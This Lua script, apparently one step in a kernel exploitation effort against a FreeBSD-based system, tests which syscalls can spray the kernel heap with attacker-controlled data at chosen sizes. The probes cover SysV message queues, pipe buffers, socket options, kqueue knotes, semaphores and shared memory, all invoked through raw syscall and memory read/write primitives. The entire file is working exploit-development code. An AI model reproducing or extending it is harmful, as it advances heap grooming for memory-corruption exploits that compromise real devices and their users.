-- CRASH_CLASS: LOW
-- PROBE 559a: Search for kernel heap spray vehicles
--
-- 555a confirmed IPv6 sticky options (DSTOPTS/HOPOPTS/RTHDR) all fail.
-- We need an alternative for controlled kernel allocation at specific sizes.
--
-- Test candidates:
-- A) SysV message queues (msgget/msgsnd/msgrcv) — classic Linux spray
-- B) POSIX message queues (mq_open/mq_send)
-- C) Pipe buffer spray (pipe + write controlled data)
-- D) Socket options survey — which setsockopt creates kernel allocs?
-- E) kqueue knote spray (EVFILT_USER or similar)
-- F) AIO submission spray (many AIO ops = many kernel structs)
-- G) sendmsg with cmsg_data (SCM_RIGHTS, SCM_CREDS)
-- H) semaphore spray (semget + semop)

print("=== PROBE 559a: SPRAY VEHICLE HUNT ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end

local Z = uint64(0)
local sc6   = mk(6)   -- close
local sc20  = mk(20)  -- getpid

local pid = N(sc20())
print("pid=" .. pid)
io.flush()

-- ============================================================
-- A) SysV message queues: msgget(224), msgsnd(226), msgrcv(227), msgctl(225)
-- NOTE: FreeBSD msgget=225, msgsnd=226, msgrcv=227, msgctl=224
-- Wait: BSD has different numbers than Linux
-- FreeBSD: msgctl=224, msgget=225, msgsnd=226, msgrcv=227
-- ============================================================
print("")
print("--- A: SysV message queues ---")
io.flush()

local sc_msgctl = mk(224)
local sc_msgget = mk(225)
local sc_msgsnd = mk(226)
local sc_msgrcv = mk(227)

-- IPC_PRIVATE=0, IPC_CREAT=0x200, 0666=0x1B6
local ok_mg, rv_mg = pcall(function()
    return sc_msgget(Z, uint64(0x3B6))  -- IPC_PRIVATE|IPC_CREAT|0666
end)
local mqid = ok_mg and N(rv_mg) or -999
print(string.format("msgget(IPC_PRIVATE|IPC_CREAT) = %d", mqid))

if mqid >= 0 then
    -- Try msgsnd: struct { long mtype; char mtext[N]; }
    local msgbuf = memory.alloc(256)
    wq(msgbuf, uint64(1))  -- mtype = 1
    -- Fill mtext with pattern
    for off = 8, 128 - 1, 4 do
        wd(msgbuf + off, 0xDEAD0000 + off)
    end

    local ok_ms, rv_ms = pcall(function()
        return sc_msgsnd(uint64(mqid), uint64(msgbuf), uint64(120), Z)
    end)
    local msnd_rv = ok_ms and N(rv_ms) or -999
    print(string.format("  msgsnd(120 bytes) = %d", msnd_rv))

    if msnd_rv == 0 then
        print("  *** SysV MSG SPRAY WORKS! ***")

        -- Read it back
        local rcvbuf = memory.alloc(256)
        zero(rcvbuf, 256)
        local ok_mr, rv_mr = pcall(function()
            return sc_msgrcv(uint64(mqid), uint64(rcvbuf), uint64(120), Z, Z)
        end)
        local mrcv_rv = ok_mr and N(rv_mr) or -999
        print(string.format("  msgrcv = %d", mrcv_rv))

        local tag = rb(rcvbuf + 8) or 0
        print(string.format("  readback tag = 0x%08X (expect 0xDEAD0008)", tag))

        -- Test different sizes for zone targeting
        for _, sz in ipairs({32, 64, 96, 128, 192, 256, 512, 1024}) do
            wq(msgbuf, uint64(1))
            for off = 8, sz - 1, 4 do
                wd(msgbuf + off, 0xAAAA0000 + sz)
            end
            local ok_s, rv_s = pcall(function()
                return sc_msgsnd(uint64(mqid), uint64(msgbuf), uint64(sz), Z)
            end)
            local srv = ok_s and N(rv_s) or -999
            print(string.format("  sz=%d: msgsnd=%d", sz, srv))
        end
    end

    -- Cleanup
    pcall(function() sc_msgctl(uint64(mqid), uint64(0), Z) end) -- IPC_RMID=0
else
    print("  SysV MSG NOT AVAILABLE (or blocked)")
end
io.flush()

-- ============================================================
-- B) Pipe buffer spray
-- ============================================================
print("")
print("--- B: Pipe buffer spray ---")
io.flush()

local sc_pipe = mk(42)  -- pipe returns through retval (r0=rd, r1=wr)
local sc_write = mk(4)
local sc_read  = mk(3)

-- Use pipe2(542) instead — works better
local sc_pipe2 = mk(542)
local pipefds = memory.alloc(8)
local ok_p, rv_p = pcall(function()
    return sc_pipe2(uint64(pipefds), Z)
end)
local pipe_rv = ok_p and N(rv_p) or -999
local pipe_rd_fd = rd(pipefds) or -1
local pipe_wr_fd = rd(pipefds + 4) or -1
print(string.format("pipe2 = %d (rd=%d wr=%d)", pipe_rv, pipe_rd_fd, pipe_wr_fd))

if pipe_rd_fd >= 0 and pipe_wr_fd >= 0 then
    -- Write controlled data
    local wbuf = memory.alloc(256)
    for off = 0, 0xFC, 4 do wd(wbuf + off, 0xCAFE0000 + off) end

    local ok_w, rv_w = pcall(function()
        return sc_write(uint64(pipe_wr_fd), uint64(wbuf), uint64(128))
    end)
    local wrv = ok_w and N(rv_w) or -999
    print(string.format("  write(128) = %d", wrv))

    if wrv == 128 then
        -- Read back
        local rbuf = memory.alloc(256)
        zero(rbuf, 256)
        local ok_r, rv_r = pcall(function()
            return sc_read(uint64(pipe_rd_fd), uint64(rbuf), uint64(128))
        end)
        local rrv = ok_r and N(rv_r) or -999
        local tag = rb(rbuf) or 0
        print(string.format("  read = %d tag=0x%08X (expect 0xCAFE0000)", rrv, tag))
        print("  *** PIPE SPRAY WORKS! ***")

        -- Test max pipe buffer size
        local bigbuf = memory.alloc(0x4000)
        for off = 0, 0x3FFC, 4 do wd(bigbuf + off, 0xBEEF0000) end
        for _, sz in ipairs({0x1000, 0x2000, 0x4000, 0x8000, 0x10000}) do
            local ok_big, rv_big = pcall(function()
                return sc_write(uint64(pipe_wr_fd), uint64(bigbuf),
                    uint64(math.min(sz, 0x4000)))
            end)
            local brv = ok_big and N(rv_big) or -999
            print(string.format("  write(%d) = %d", sz, brv))
        end
    end

    pcall(function() sc6(uint64(pipe_rd_fd)) end)
    pcall(function() sc6(uint64(pipe_wr_fd)) end)
end
io.flush()

-- ============================================================
-- C) Socket options survey — which SO_* create kernel allocs?
-- ============================================================
print("")
print("--- C: Socket option survey ---")
io.flush()

local sc_socket = mk(97)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)

-- Create test sockets
local test_fd = -1
do
    local ok, v = pcall(function()
        return sc_socket(uint64(1), uint64(1), uint64(0))  -- AF_UNIX, STREAM
    end)
    test_fd = ok and N(v) or -1
end
print("test socket fd=" .. test_fd)

if test_fd >= 0 then
    -- Test options that might do kernel allocations
    -- SOL_SOCKET=0xFFFF
    local SOL = 0xFFFF
    local optbuf = memory.alloc(256)

    local opts = {
        {0x0001, 4, "SO_DEBUG"},
        {0x0004, 4, "SO_KEEPALIVE"},
        {0x0008, 4, "SO_DONTROUTE"},
        {0x0080, 4, "SO_LINGER (struct)"},
        {0x0100, 4, "SO_OOBINLINE"},
        {0x1001, 4, "SO_SNDBUF"},
        {0x1002, 4, "SO_RCVBUF"},
        {0x1005, 4, "SO_SNDTIMEO"},
        {0x1006, 4, "SO_RCVTIMEO"},
        {0x1015, 4, "SO_LISTENQLIMIT"},
        {0x1017, 4, "SO_SETFIB"},
        {0x1019, 4, "SO_USER_COOKIE"},
        {0x101A, 4, "SO_PROTOCOL"},
        {0x101C, 4, "SO_DOMAIN"},
    }

    for _, o in ipairs(opts) do
        wd(optbuf, 1)
        local ok_s, rv_s = pcall(function()
            return sc_setsockopt(uint64(test_fd), uint64(SOL),
                uint64(o[1]), uint64(optbuf), uint64(o[2]))
        end)
        local srv = ok_s and N(rv_s) or -999
        if srv ~= -1 and srv ~= -999 then
            print(string.format("  %s (0x%04X) set=OK", o[3], o[1]))
        end
    end

    -- Try TCP options (IPPROTO_TCP=6)
    local tcp_fd = -1
    do
        local ok, v = pcall(function()
            return sc_socket(uint64(2), uint64(1), uint64(6))  -- AF_INET, STREAM, TCP
        end)
        tcp_fd = ok and N(v) or -1
    end

    if tcp_fd >= 0 then
        print("  tcp socket fd=" .. tcp_fd)
        local tcp_opts = {
            {1, 4, "TCP_NODELAY"},
            {2, 4, "TCP_MAXSEG"},
            {4, 4, "TCP_NOOPT"},
            {8, 4, "TCP_NOPUSH"},
            {32, 4, "TCP_FASTOPEN"},
            {64, 4, "TCP_FUNCTION_BLK (128B)"},
        }
        for _, o in ipairs(tcp_opts) do
            zero(optbuf, 256)
            wd(optbuf, 1)
            local ok_t, rv_t = pcall(function()
                return sc_setsockopt(uint64(tcp_fd), uint64(6),
                    uint64(o[1]), uint64(optbuf), uint64(o[2]))
            end)
            local trv = ok_t and N(rv_t) or -999
            if trv ~= -1 and trv ~= -999 then
                print(string.format("  TCP %s (0x%X) set=OK", o[3], o[1]))
            end
        end
        pcall(function() sc6(uint64(tcp_fd)) end)
    end

    -- IPv6 options on the IPv6 socket
    local ipv6_fd = -1
    do
        local ok, v = pcall(function()
            return sc_socket(uint64(28), uint64(2), uint64(0))
        end)
        ipv6_fd = ok and N(v) or -1
    end

    if ipv6_fd >= 0 then
        print("  ipv6 socket fd=" .. ipv6_fd)
        local IPPROTO_IPV6 = 41
        local ipv6_opts = {
            {6, 4, "IPV6_UNICAST_HOPS"},
            {8, 4, "IPV6_MULTICAST_IF"},
            {9, 4, "IPV6_MULTICAST_HOPS"},
            {10, 4, "IPV6_MULTICAST_LOOP"},
            {12, 128, "IPV6_JOIN_GROUP (struct)"},
            {26, 4, "IPV6_V6ONLY"},
            {27, 4, "IPV6_PORTRANGE"},
            {36, 4, "IPV6_RECVTCLASS"},
            {50, 120, "IPV6_DSTOPTS (retry 120B)"},
            {50, 8, "IPV6_DSTOPTS (8B min)"},
            {49, 8, "IPV6_HOPOPTS (8B min)"},
            {48, 4, "IPV6_PKTINFO (struct)"},
            {61, 4, "IPV6_RECVPATHMTU"},
            {62, 4, "IPV6_USE_MIN_MTU"},
            {69, 4, "IPV6_DONTFRAG"},
            {73, 4, "IPV6_ORIGDSTADDR"},
        }

        for _, o in ipairs(ipv6_opts) do
            zero(optbuf, 256)
            wd(optbuf, 1)
            -- For DSTOPTS, build proper header
            if o[1] == 50 or o[1] == 49 then
                local hlen = math.floor(o[2] / 8) - 1
                wd(optbuf, hlen * 0x100 + 1 * 0x10000 + (o[2] - 4) * 0x1000000)
            end

            local ok_i, rv_i = pcall(function()
                return sc_setsockopt(uint64(ipv6_fd), uint64(IPPROTO_IPV6),
                    uint64(o[1]), uint64(optbuf), uint64(o[2]))
            end)
            local irv = ok_i and N(rv_i) or -999
            if irv >= 0 then
                print(string.format("  IPv6 %s (%d, %dB) set=OK", o[3], o[1], o[2]))
            end
        end
        pcall(function() sc6(uint64(ipv6_fd)) end)
    end

    pcall(function() sc6(uint64(test_fd)) end)
end
io.flush()

-- ============================================================
-- D) kqueue knote spray
-- ============================================================
print("")
print("--- D: kqueue knote spray ---")
io.flush()

local sc_kqueue = mk(362)
local sc_kevent = mk(363)

local ok_kq, kq_fd = pcall(function() return sc_kqueue() end)
kq_fd = ok_kq and N(kq_fd) or -1
print("kqueue fd=" .. kq_fd)

if kq_fd >= 0 then
    -- Add multiple EVFILT_USER knotes — each is a kernel alloc
    -- struct kevent: ident(8), filter(2), flags(2), fflags(4), data(8), udata(8) = 32 bytes
    local kevbuf = memory.alloc(0x200)

    local added = 0
    for i = 1, 20 do
        zero(kevbuf, 32)
        wq(kevbuf + 0, uint64(i))             -- ident = i
        wd(kevbuf + 8, 0x0001FFEB)            -- filter=EVFILT_USER(-11=0xFFF5? no, -11), flags=EV_ADD(1)
        -- EVFILT_USER = -11 = 0xFFF5 as i16
        -- Actually: filter is signed 16-bit. -11 = 0xFFF5
        -- flags EV_ADD = 0x0001
        -- Pack: lo16=filter=0xFFF5, hi16=flags=0x0001 → dword = 0x0001FFF5
        wd(kevbuf + 8, 0x0001FFF5)            -- filter=EVFILT_USER, flags=EV_ADD
        wq(kevbuf + 16, uint64(i * 0x1000))   -- data
        wq(kevbuf + 24, uint64(0xDEAD0000 + i)) -- udata

        local ok_ke, rv_ke = pcall(function()
            return sc_kevent(uint64(kq_fd), uint64(kevbuf), uint64(1),
                Z, Z, Z)
        end)
        local kerv = ok_ke and N(rv_ke) or -999
        if kerv >= 0 then added = added + 1 end
    end
    print(string.format("  added %d EVFILT_USER knotes", added))

    -- Try EVFILT_TIMER too
    zero(kevbuf, 32)
    wq(kevbuf + 0, uint64(100))          -- ident=100
    -- EVFILT_TIMER = -7 = 0xFFF9
    wd(kevbuf + 8, 0x0001FFF9)           -- filter=EVFILT_TIMER, flags=EV_ADD
    wq(kevbuf + 16, uint64(60000))       -- data = 60s timer (won't fire during probe)

    local ok_kt, rv_kt = pcall(function()
        return sc_kevent(uint64(kq_fd), uint64(kevbuf), uint64(1),
            Z, Z, Z)
    end)
    local ktrv = ok_kt and N(rv_kt) or -999
    print(string.format("  EVFILT_TIMER add = %d", ktrv))

    pcall(function() sc6(uint64(kq_fd)) end)
end
io.flush()

-- ============================================================
-- E) Semaphore spray
-- ============================================================
print("")
print("--- E: Semaphore spray ---")
io.flush()

-- FreeBSD: semget=221, semop=222, semctl=220
local sc_semget = mk(221)
local sc_semop  = mk(222)
local sc_semctl = mk(220)

local ok_sg, semid = pcall(function()
    return sc_semget(Z, uint64(4), uint64(0x3B6))  -- IPC_PRIVATE, 4 sems, IPC_CREAT|0666
end)
semid = ok_sg and N(semid) or -999
print(string.format("semget(4 sems) = %d", semid))

if semid >= 0 then
    print("  *** SEMAPHORE SPRAY AVAILABLE! ***")
    pcall(function() sc_semctl(uint64(semid), Z, uint64(0), Z) end) -- IPC_RMID
end
io.flush()

-- ============================================================
-- F) SHM spray
-- ============================================================
print("")
print("--- F: SHM object spray ---")
io.flush()

local sc_shm_open = mk(482)
local sc_ftruncate = mk(480)
local sc_unlink = mk(483)  -- shm_unlink

-- SHM_ANON
local ok_sh, shm_fd = pcall(function()
    return sc_shm_open(uint64(1), uint64(0x602), uint64(0x1B6))
    -- SHM_ANON=1, O_CREAT|O_RDWR|O_EXCL, 0666
end)
shm_fd = ok_sh and N(shm_fd) or -999
print(string.format("shm_open(SHM_ANON) = %d", shm_fd))

if shm_fd >= 0 then
    pcall(function() sc_ftruncate(uint64(shm_fd), uint64(0x1000)) end)
    print("  *** SHM SPRAY AVAILABLE! ***")
    pcall(function() sc6(uint64(shm_fd)) end)
end
io.flush()

print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " DEAD"))
print("=== 559a DONE ===")
